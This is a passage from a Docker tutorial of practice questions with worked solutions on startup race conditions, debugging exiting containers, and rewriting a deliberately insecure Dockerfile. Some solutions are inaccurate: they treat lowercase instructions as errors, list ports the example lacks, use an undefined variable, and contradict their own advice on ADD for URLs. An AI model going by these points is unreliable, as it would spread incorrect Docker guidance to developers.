EXPOSE 8000

CMD ["python", "app.py"]
```

**Usage:**
```bash
# Build with specific version
docker build \
  --build-arg GITHUB_REPO=user/repo \
  --build-arg GITHUB_REF=v1.2.3 \
  --build-arg ARCHIVE_SHA256=abc123... \
  -t myapp:1.2.3 \
  .
```

**Key Takeaways:**
1. **Avoid ADD for URLs** - use RUN + curl
2. **Pin specific versions** - use tags/commits, not branches
3. **Verify downloads** - check checksums
4. **Clean up in same layer** - reduce image size
5. **Use multi-stage** - keep final image clean
6. **Handle errors** - use -f flag with curl
7. **Document versions** - use build args

---

### Question 99
**docker-compose.yml:**
```yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    depends_on:
      - db
    environment:
      - DATABASE_URL=postgres://db:5432/myapp

  db:
    image: postgres:14
    environment:
      - POSTGRES_DB=myapp
```

**Issue:** App fails to connect to database with "connection refused" error.

**Tasks:**
a. What's the race condition?  
b. Provide solutions

**Solution:**

**a. The Race Condition:**

1. **Issue:** depends_on only waits for container to START, not be READY
2. **Issue:** App tries to connect before PostgreSQL is ready
3. **Issue:** PostgreSQL takes time to initialize

**What Happens:**
```
t=0s:  db container starts
t=1s:  app container starts (depends_on satisfied)
t=1s:  app tries to connect to database
t=1s:  ERROR: Connection refused (postgres still starting)
t=5s:  PostgreSQL ready
t=5s:  App already crashed
```

**b. Solutions:**

**Option 1: Wait in entrypoint script:**

**Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install netcat for connection testing
RUN apt-get update && \
    apt-get install -y --no-install-recommends netcat-openbsd && \
    rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
CMD ["python", "app.py"]
```

**entrypoint.sh:**
```bash
#!/bin/bash
set -e

echo "Waiting for database..."
while ! nc -z db 5432; do
  echo "Database is unavailable - sleeping"
  sleep 1
done
echo "Database is up - executing command"

exec "$@"
```

**Option 2: Use wait-for-it script:**

**Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Download wait-for-it
ADD https://raw.githubusercontent.com/vishnubob/wait-for-it/master/wait-for-it.sh /usr/local/bin/wait-for-it
RUN chmod +x /usr/local/bin/wait-for-it

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["wait-for-it", "db:5432", "--", "python", "app.py"]
```

**Option 3: Use docker-compose healthcheck:**

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    depends_on:
      db:
        condition: service_healthy
    environment:
      - DATABASE_URL=postgres://postgres:secret@db:5432/myapp
    restart: on-failure

  db:
    image: postgres:14-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=secret
    volumes:
      - postgres-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres -d myapp"]
      interval: 5s
      timeout: 5s
      retries: 5
      start_period: 10s

volumes:
  postgres-data:
```

**Option 4: Application-level retry:**

**app.py:**
```python
import time
import psycopg2
from flask import Flask

app = Flask(__name__)

def wait_for_db(max_retries=30):
    for i in range(max_retries):
        try:
            conn = psycopg2.connect(DATABASE_URL)
            conn.close()
            print("Database connection successful!")
            return
        except psycopg2.OperationalError:
            print(f"Database unavailable, retry {i+1}/{max_retries}")
            time.sleep(2)
    raise Exception("Could not connect to database")

if __name__ == '__main__':
    wait_for_db()
    app.run(host='0.0.0.0', port=3000)
```

**Option 5: Use restart policy:**

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    depends_on:
      - db
    environment:
      - DATABASE_URL=postgres://db:5432/myapp
    restart: on-failure:5  # Retry up to 5 times
    
  db:
    image: postgres:14
    environment:
      - POSTGRES_DB=myapp
    healthcheck:
      test: ["CMD", "pg_isready"]
      interval: 5s
      timeout: 5s
      retries: 5
```

**Explanation for Beginners:**

**Understanding depends_on:**

**What it does:**
- Starts containers in order
- Waits for container to START

**What it DOESN'T do:**
- Wait for service to be READY
- Check if database is accepting connections
- Verify service is fully initialized

**Race Condition Example:**
```
Without wait:
00:00 - db container starts
00:01 - app container starts
00:01 - app tries to connect → FAIL
00:05 - db ready (too late!)

With wait:
00:00 - db container starts
00:01 - app container starts
00:01 - app waits for db:5432
00:02 - app waits...
00:03 - app waits...
00:05 - db ready!
00:05 - app connects → SUCCESS
```

**Solutions Comparison:**

**1. Entrypoint wait script (simple):**
- Pros: Simple, works everywhere
- Cons: Manual implementation

**2. wait-for-it (popular tool):**
- Pros: Well-tested, flexible
- Cons: External dependency

**3. Health checks (recommended):**
- Pros: Docker-native, reliable
- Cons: Requires Docker Compose 3.x+

**4. Application retry logic:**
- Pros: No external dependencies
- Cons: Must implement in app

**5. Restart policy:**
- Pros: Simple, no code changes
- Cons: Delays startup, logs show errors

**Best Practice: Combine approaches:**
```yaml
services:
  app:
    depends_on:
      db:
        condition: service_healthy  # Wait for health check
    restart: on-failure            # Retry if fails
    # Plus: entrypoint wait script
    
  db:
    healthcheck:
      test: ["CMD", "pg_isready"]  # Define what "healthy" means
```

**Complete Production Example:**

**Dockerfile:**
```dockerfile
FROM python:3.9-slim

# Install wait tools
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    netcat-openbsd \
    curl \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Entrypoint with wait logic
COPY docker-entrypoint.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/docker-entrypoint.sh && \
    useradd -m appuser && \
    chown -R appuser:appuser /app

USER appuser

EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=3s --start-period=40s \
    CMD curl -f http://localhost:8000/health || exit 1

ENTRYPOINT ["docker-entrypoint.sh"]
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "--workers", "4", "app:app"]
```

**docker-entrypoint.sh:**
```bash
#!/bin/bash
set -e

# Function to wait for service
wait_for_service() {
    local host=$1
    local port=$2
    local service=$3
    local max_attempts=30
    local attempt=1

    echo "Waiting for $service at $host:$port..."
    
    while ! nc -z "$host" "$port"; do
        if [ $attempt -eq $max_attempts ]; then
            echo "ERROR: $service not available after $max_attempts attempts"
            exit 1
        fi
        echo "Attempt $attempt/$max_attempts: $service unavailable - sleeping"
        sleep 2
        attempt=$((attempt + 1))
    done
    
    echo "✓ $service is available at $host:$port"
}

# Wait for database
if [ -n "$DB_HOST" ]; then
    wait_for_service "${DB_HOST}" "${DB_PORT:-5432}" "Database"
fi

# Wait for Redis
if [ -n "$REDIS_HOST" ]; then
    wait_for_service "${REDIS_HOST}" "${REDIS_PORT:-6379}" "Redis"
fi

# Run migrations if requested
if [ "$RUN_MIGRATIONS" = "true" ]; then
    echo "Running database migrations..."
    python manage.py migrate --noinput
    echo "✓ Migrations completed"
fi

echo "Starting application..."
exec "$@"
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "8000:8000"
    environment:
      - DB_HOST=db
      - DB_PORT=5432
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - RUN_MIGRATIONS=true
      - DATABASE_URL=postgresql://user:password@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - backend
    restart: on-failure

  db:
    image: postgres:14-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=password
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - backend
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d myapp"]
      interval: 5s
      timeout: 5s
      retries: 10
      start_period: 10s

  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes
    volumes:
      - redis-data:/data
    networks:
      - backend
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 10
      start_period: 5s

networks:
  backend:
    driver: bridge

volumes:
  postgres-data:
  redis-data:
```

**Key Takeaways:**
1. **depends_on starts containers, doesn't wait for readiness**
2. **Use healthchecks** to define when service is ready
3. **Implement wait logic** in entrypoint scripts
4. **Use restart policies** as fallback
5. **Application-level retries** add resilience
6. **Combine multiple strategies** for robustness
7. **Test startup order** in development

---

### Question 98
**Real-world debugging scenario:**

```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["gunicorn", "app:application"]
```

**Issue:** Container starts but immediately exits with code 0.

**Tasks:**
a. What debugging steps would you take?  
b. Identify potential causes  
c. Provide fixes

**Solution:**

**a. Debugging Steps:**

**Step 1: Check logs**
```bash
docker logs container_name
docker logs --tail 50 container_name
docker logs -f container_name
```

**Step 2: Check if process started**
```bash
docker ps -a  # Shows exited containers
docker inspect container_name  # Check exit code and error
```

**Step 3: Run interactively**
```bash
docker run -it --rm myapp /bin/bash
# Or
docker run -it --rm myapp /bin/sh

# Then manually test:
gunicorn app:application
```

**Step 4: Check application name**
```bash
docker run -it --rm myapp python -c "from app import application; print(application)"
```

**Step 5: Override entrypoint**
```bash
docker run -it --rm --entrypoint /bin/bash myapp
# Now you're in the container, test commands
```

**b. Potential Causes:**

1. **Wrong application reference**: `app:application` vs `app:app`
2. **Import error**: Module not found
3. **Configuration error**: Missing environment variables
4. **Permission error**: Can't read files
5. **Port binding error**: Can't bind to port
6. **Immediate exit**: Command completes successfully but immediately
7. **Missing dependency**: Package not installed

**c. Fixes:**

**Fix 1: Correct application reference**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Check if app:application or app:app
RUN python -c "from app import application"

# Add bind address
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:application"]
```

**Fix 2: Add logging and error handling**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Verify application loads
RUN python -c "from app import application; print('App loads successfully')"

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

EXPOSE 8000

# Add verbose logging
CMD ["gunicorn", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "4", \
     "--log-level", "debug", \
     "--access-logfile", "-", \
     "--error-logfile", "-", \
     "app:application"]
```

**Fix 3: Use entrypoint for debugging**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh

RUN useradd -m appuser && chown -R appuser:appuser /app /entrypoint.sh
USER appuser

ENTRYPOINT ["/entrypoint.sh"]
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:application"]
```

**entrypoint.sh:**
```bash
#!/bin/bash
set -e

echo "========================================="
echo "Starting application"
echo "Time: $(date)"
echo "User: $(whoami)"
echo "Working directory: $(pwd)"
echo "Python version: $(python --version)"
echo "========================================="

# Test imports
echo "Testing imports..."
python -c "from app import application; print('✓ Application imports successfully')"

# Test database connection
if [ -n "$DATABASE_URL" ]; then
  echo "Testing database connection..."
  python -c "from app import db; db.engine.connect(); print('✓ Database connection successful')"
fi

echo "Starting gunicorn..."
echo "Command: $@"

exec "$@"
```

**Explanation for Beginners:**

**Common Exit Reasons:**

**1. Wrong application reference:**
```python
# app.py has "app" not "application"
app = Flask(__name__)

# But Dockerfile says:
CMD ["gunicorn", "app:application"]  # Wrong!
# Should be:
CMD ["gunicorn", "app:app"]  # Correct!
```

**2. Import errors:**
```python
from missing_module import something
# Container starts, import fails, exits
```

**3. Configuration errors:**
```python
config = os.environ['REQUIRED_VAR']  # KeyError if not set
# Container exits immediately
```

**Debugging Techniques:**

**1. Interactive shell:**
```bash
docker run -it --rm myapp /bin/bash
# Manually test your command
```

**2. Override CMD:**
```bash
docker run -it --rm myapp python app.py
docker run -it --rm myapp gunicorn app:app
```

**3. Check logs verbosely:**
```bash
docker run --rm myapp  # Run in foreground, see all output
```

**4. Add debugging to entrypoint:**
```bash
#!/bin/bash
set -ex  # -x prints each command
# Now you see exactly what's executing
```

**5. Test imports:**
```bash
docker run --rm myapp python -c "from app import application"
```

**Prevention:**

**1. Verify during build:**
```dockerfile
RUN python -c "from app import application"
```

**2. Add health check:**
```dockerfile
HEALTHCHECK CMD curl -f http://localhost:8000/health || exit 1
```

**3. Use verbose logging:**
```dockerfile
CMD ["gunicorn", "--log-level", "debug", "app:application"]
```

**4. Test locally:**
```bash
# Test before containerizing
python -m gunicorn app:application
```

---

### Question 100
**Ultimate Challenge - Fix Everything:**

```dockerfile
from ubuntu
run apt install python
ENV PASSWORD=admin123
copy . /
WORKDIR src
run pip install -r requirements.txt
VOLUME /
USER root
EXPOSE 80
CMD python app.py
ENTRYPOINT service nginx start && service redis start
```

**Tasks:**
a. Identify ALL errors (there are 15+)  
b. Rewrite completely with best practices

**Solution:**

**a. All Errors:**

1. **Lowercase `from`** - should be `FROM`
2. **Lowercase `run`** - should be `RUN`
3. **Lowercase `copy`** - should be `COPY`
4. **No base image version** - ubuntu:20.04
5. **Missing apt-get and -y** - `apt-get install -y`
6. **Hardcoded password** - security vulnerability
7. **Copying to root** - should use /app
8. **WORKDIR src** - relative path, should be /app
9. **No apt-get update** before install
10. **VOLUME /** - voluming entire filesystem (wrong!)
11. **USER root** - redundant and insecure
12. **Multiple services** - nginx and redis shouldn't be in app container
13. **Shell form CMD** - poor signal handling
14. **ENTRYPOINT starting services** - services don't persist in containers
15. **No cleanup** - apt cache not cleaned
16. **Wrong pattern** - trying to run multiple services
17. **No non-root user** for application
18. **Missing package versions**
19. **No layer optimization**
20. **EXPOSE wrong ports** - 6379 and 5432 are external services

**b. Complete Rewrite:**

**Python API (api/Dockerfile):**
```dockerfile
FROM python:3.9-slim

# Build arguments
ARG DEBIAN_FRONTEND=noninteractive

# System dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    libpq5 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn

# Application code
COPY src/ ./src/
COPY config/ ./config/

# Non-root user
RUN groupadd -r -g 1000 appuser && \
    useradd -r -u 1000 -g appuser -m appuser && \
    chown -R appuser:appuser /app

USER appuser

# Only the application port
EXPOSE 8000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s \
    CMD python -c "import requests; requests.get('http://localhost:8000/health')" || exit 1

# Production WSGI server
CMD ["gunicorn", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "4", \
     "--worker-class", "sync", \
     "--timeout", "30", \
     "--access-logfile", "-", \
     "--error-logfile", "-", \
     "src.app:app"]
```

**Worker (worker/Dockerfile):**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY src/ ./src/

RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

CMD ["celery", "-A", "src.tasks", "worker", "--loglevel=info", "--concurrency=4"]
```

**Frontend (frontend/Dockerfile):**
```dockerfile
FROM node:16-alpine AS build

WORKDIR /app

COPY package*.json ./
RUN npm ci

COPY . .
RUN npm run build

FROM nginx:alpine

COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

RUN chown -R nginx:nginx /usr/share/nginx/html

USER nginx

EXPOSE 80

HEALTHCHECK CMD wget --no-verbose --tries=1 --spider http://localhost/ || exit 1

CMD ["nginx", "-g", "daemon off;"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  frontend:
    build: ./frontend
    ports:
      - "80:80"
    depends_on:
      - api
    networks:
      - app-network
    restart: unless-stopped

  api:
    build: ./api
    ports:
      - "8000:8000"
    env_file:
      - .env.production
    environment:
      - DATABASE_URL=postgresql://user:$$POSTGRES_PASSWORD@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped
    deploy:
      replicas: 2

  worker:
    build: ./worker
    env_file:
      - .env.production
    environment:
      - DATABASE_URL=postgresql://user:$$POSTGRES_PASSWORD@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped
    deploy:
      replicas: 3

  db:
    image: postgres:14-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    volumes:
      - postgres-data:/var/lib/postgresql/data
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    networks:
      - app-network
    restart: unless-stopped
    secrets:
      - db_password
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d myapp"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes --requirepass $$REDIS_PASSWORD
    volumes:
      - redis-data:/data
    networks:
      - app-network
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 3s
      retries: 3

networks:
  app-network:
    driver: bridge

volumes:
  postgres-data:
  redis-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**.env.production (not committed to git!):**
```
FLASK_ENV=production
SECRET_KEY=your-secret-key-from-secure-source
REDIS_PASSWORD=secure-redis-password
```

**.dockerignore:**
```
**/__pycache__
**/*.pyc
**/.env
**/.env.*
**/node_modules
.git
.vscode
.idea
*.md
tests/
docs/
.pytest_cache
htmlcov/
.coverage
```

**Explanation for Beginners:**

**Complete Best Practices Applied:**

**1. Proper Syntax:**
- All instructions UPPERCASE
- Exec form for CMD/ENTRYPOINT
- Specific base image versions

**2. Security:**
- No hardcoded secrets
- Non-root users
- Proper file permissions
- Minimal base images
- No unnecessary services

**3. Architecture:**
- One process per container
- Separate services
- Proper orchestration
- Health checks
- Restart policies

**4. Optimization:**
- Layer caching
- Multi-stage builds
- Cleanup in same layer
- .dockerignore
- Minimal images

**5. Maintainability:**
- Clear structure
- Documentation
- Version pinning
- Resource limits
- Monitoring/health checks

**Before vs After:**

**Before:**
- 1 monolithic container
- 800MB image
- Root user
- Hardcoded secrets
- No health checks
- Multiple services failing

**After:**
- 4 focused containers
- 150MB+ 50MB+ 25MB images
- Non-root users
- Secure secret management
- Health checks on all services
- Each service independent and scalable

---

## Summary and Key Takeaways

### Common Error Categories:

**1. Syntax Errors:**
- Lowercase instructions
- Missing arguments
- Wrong flags

**2. Path Issues:**
- Missing WORKDIR
- Absolute vs relative paths
- Build context limitations

**3. Security Issues:**
- Running as root
- Hardcoded secrets
- chmod 777
- Unnecessary packages

**4. Architecture Issues:**
- Multiple services in one container
- Monolithic design
- Wrong use of multi-stage

**5. Optimization Issues:**
- Too many layers
- No caching strategy
- Large base images
- Not cleaning up

### Best Practices Checklist:

✅ **Base Images:**
- Use specific versions (not :latest)
- Use minimal images (-slim, -alpine)
- Use official images when possible

✅ **Structure:**
- Set WORKDIR early
- Copy dependencies before code
- Use multi-stage builds
- One process per container

✅ **Security:**
- Run as non-root user
- Don't hardcode secrets
- Proper file permissions
- Minimal attack surface

✅ **Optimization:**
- Combine RUN commands
- Clean up in same layer
- Use .dockerignore
- Leverage layer caching

✅ **Operations:**
- Add health checks
- Use exec form for CMD/ENTRYPOINT
- Set resource limits
- Implement proper logging

✅ **Development:**
- Use docker-compose
- Separate dev/prod configurations
- Document environment variables
- Test builds before deploying

### Testing Your Knowledge:

After completing these 100 questions, you should be able to:

1. ✅ Identify syntax errors immediately
2. ✅ Understand path and WORKDIR issues
3. ✅ Recognize security vulnerabilities
4. ✅ Optimize Dockerfiles for size and speed
5. ✅ Design proper multi-stage builds
6. ✅ Handle secrets securely
7. ✅ Debug container issues
8. ✅ Architect microservices properly
9. ✅ Apply Docker best practices
10. ✅ Build production-ready images

### Additional Practice:

1. **Try building each example** - hands-on is best
2. **Break working Dockerfiles** - introduce errors and fix them
3. **Review real-world projects** - analyze open-source Dockerfiles
4. **Experiment with optimizations** - measure image sizes
5. **Practice debugging** - intentionally create issues and solve them

### Resources for Continued Learning:

- Docker Official Documentation
- Docker Best Practices Guide
- Security scanning tools (Trivy, Snyk, Clair)
- Official language-specific Docker guides
- Open-source project Dockerfiles

---

**Congratulations!** You've completed all 100 Docker error identification practice questions! 🎉

Keep practicing, and remember: The best way to learn is by doing. Build images, make mistakes, debug them, and learn from each error!
